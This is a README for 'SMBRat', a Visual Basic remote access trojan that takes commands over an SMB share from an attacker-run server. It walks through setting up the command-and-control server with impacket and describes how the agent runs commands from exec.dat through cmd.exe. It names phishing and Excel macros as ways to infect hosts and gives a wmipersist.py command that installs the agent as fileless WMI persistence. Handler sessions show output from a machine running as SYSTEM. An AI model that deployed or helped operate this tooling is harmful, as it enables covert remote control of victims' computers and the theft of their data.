# SMBRat
A Windows Remote Administration Tool in Visual Basic


## Ingredients

### Handler

The `handler` needs an SMB Server to work. The `smbserver.py` module from [*Core Security's* `impacket`](https://github.com/coresecurity/impacket) package will do.

Most probably `smbd` would also do the trick, but it hasn't been tested yet.

#### Setting up the SMBServer

A share with name `D$` is needed, to look like a legit Windows host's SMB.

```bash
(impacket) root@Deskjet-4540:/home/unused/Tools/RATs/SMBRat# mkdir Share
(impacket) root@Deskjet-4540:/home/unused/Tools/RATs/SMBRat# smbserver.py -comment "My Share" "D$" Share/
Impacket v0.9.17-dev - Copyright 2002-2018 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

### Agent

The `agent` is a *Visual Basic Script* that runs on the infected host and connects to the *SMB Server*. It creates a folder in there named after the host's `hostname` and primary `MAC` address (trying to be *unique* and *informative* at the same time for reporting purposes).
It does **NOT** use a drive letter to *Mount* the Share, just uses `UNC paths` to directly read remote files.
It also injects the `UNC path` into the `%PATH%` variable of its execution environment.

#### Agent's Execution

The `agent` is configured to **run once**. **Statelessly**.
It looks for a file named `exec.dat` in the folder it created in the *SMB Share*
If it finds the file, it **reads its content** and executes it as a command with `cmd.exe /c <command>` like a *semi-interactive shell*.
The command's response is stored in `output.dat` (next to `exec.dat`). 
Then deletes the `exec.dat` file.



## Infection Scheme

A *While loop* can be added to the `agent.vbs`  file's beginning, with a delay statement of multiple seconds (10 secs is ideal), and it will be able to infect windows hosts by *double clicking* / *phishing* / *excel macros* / etc...

Yet, if a Windows host has *RPC* enabled, it is possible to install the *VBS* file as *fileless malware* through `WMI` and the fabulous `impacket` package with a command like:
```bash
(impacket) unused@Deskjet-4540:~/Tools/RATs/SMBRat$ wmipersist.py '<username>:<password>@<hostname/ipaddress>' install -vbs agent.vbs -name smbrat -timer 10
```  

It is also possible to utilize the `WMI` tool by local access to install the `agent.vbs`


## Directory Structure in the *SMB Share*

The Directory shared through SMB (named `Share` in this example) will grow using the below structure:
```
	Share/
	|
	\--Project1/
	|	|
	|	\--<Hostname1>-<MAC_ADDRESS1>/
	|	\--<Hostname2>-<MAC_ADDRESS2>/
	|
	\--Project2/
		|
		\--<Hostname3>-<MAC_ADDRESS3>/
	[...]
```

#### Never create folders manually in the Shared Folder



## Barebone Usage

~~At time of writing, no `Handler` shell is implemented,~~ so usage can be done by just using a command like `watch` to inspect the `output.dat` file:

```bash
$ watch -n0.2 cat Share/projectName/DESKTOP-XXXXXXX-AA\:BB\:CC\:DD\:EE\:FF/output.dat
```
and `echo` to write stuff to the `exec.dat` file:
```bash
$ echo 'whoami /all' > Share/projectName/DESKTOP-XXXXXXX-AA\:BB\:CC\:DD\:EE\:FF/exec.dat
```

## The `handler.py`

The experimental shell works as follows: 
```bash
$ python handler.py Share/
SMBRat> 
# When a new host gets infected:
[+] Agent "DESKTOP-EG4OE7J" (00:0C:29:2B:9F:AF) just checked in for Project: "projectName"

SMBRat> execall whoami /user

[>] Sending 'whoami /user' to "projectName/DESKTOP-EG4OE7J-00:0C:29:2B:9F:AF" ...
		
SMBRat> 
[<] Response from 'projectName/DESKTOP-EG4OE7J-00:0C:29:2B:9F:AF': 


USER INFORMATION
----------------

User Name           SID     
=================== ========
nt authority\system S-1-5-18

^^^^^^^^^^^^^^^^^^^^ projectName/DESKTOP-EG4OE7J-00:0C:29:2B:9F:AF ^^^^^^^^^^^^^^^^^^^^
SMBRat> 
				
```

## Outstanding Pitfalls

### SMBv1 is **Not Encrypted** :

```bash
# tcpdump -i eth0 -A
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes

[...]

15:25:06.695502 IP Deskjet-4540.microsoft-ds > 172.16.47.129.3128: Flags [P.], seq 2876:2971, ack 4791, win 2110, length 95 SMB PACKET: SMBreadX (REPLY)

E...,E@.@.V.../.../....8
.&Mi~.6P..>.......[.SMB........................
.@............ .;........... .net localgroup "administrators"

[...]

15:25:06.702916 IP 172.16.47.129.3128 > Deskjet-4540.microsoft-ds: Flags [P.], seq 4917:5111, ack 3097, win 2052, length 194 SMB PACKET: SMBtrans2 (REQUEST)

E...E.@......./.../..8..i~..
.'*P....b.......SMB2......................

.F..z.....(...........z.D.........}..........\.p.r.o.j.e.c.t.N.a.m.e.\.D.E.S.K.T.O.P.-.E.G.4.O.E.7.J.-.0.0.:.0.C.:.2.9.:.2.B.:.9.F.:.A.F.\.o.u.t.p.u.t...d.a.t...

[...]

15:25:06.751372 IP 172.16.47.129.3128 > Deskjet-4540.microsoft-ds: Flags [P.], seq 6049:6393, ack 3748, win 2050, length 344 SMB PACKET: SMBwrite (REQUEST)

E...E.@....L../.../..8..i~. 
.).P....*.....T.SMB........................
.T....$.......'..$.Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Admin
Administrator
defaultuser0
The command completed successfully.

[...]

```

The traffic (file *contents* and *paths*) are tranfered in plaintext if *SMBv1 Server* is used (e.g `impacket` 's `smbserver.py`).

* An encryption/obfuscation layer would totally solve this one!

### The whole Share is *READ/WRITE* to Everyone:

All Agents can modify files stored in the **Whole Share**. Meaning they can modify the `exec.dat` of other Agents...
An `smbmap` will shed light:
```bash
$ smbmap -H 172.16.47.189
[+] Finding open SMB ports....
[+] User SMB session establishd on 172.16.47.189...
[+] IP: 172.16.47.189:445	Name: Deskjet-4540                                      
	Disk                                                  	Permissions
	----                                                  	-----------
	D$                                                	READ, WRITE
	[!] Unable to remove test directory at \\172.16.47.189\D$\SVNRmxBFAO, plreae remove manually
	IPC$                                              	READ, WRITE
	[!] Unable to remove test directory at \\172.16.47.189\IPC$\SVNRmxBFAO, plreae remove manually
```
#### Pay attention to the lack of `-u` and `-p` parameters of `smbmap`.
This is a *NULL session* (like FTP anonymous login). **EVERYONE can change the SHARE Files** and get *Remote Code Execution* on all infected machines.

* Better fire up some `iptables` here...
